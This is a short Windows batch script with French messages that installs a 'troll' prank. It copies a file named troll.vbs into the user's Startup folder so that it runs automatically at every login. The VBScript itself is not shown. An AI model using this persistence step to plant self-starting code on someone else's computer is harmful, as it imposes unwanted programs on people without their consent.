@echo off
echo Installation du troll en cours...
set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
if not exist "%STARTUP%" mkdir "%STARTUP%"
copy troll.vbs "%STARTUP%\troll.vbs"
echo Troll installé pour démarrage automatique.
pause

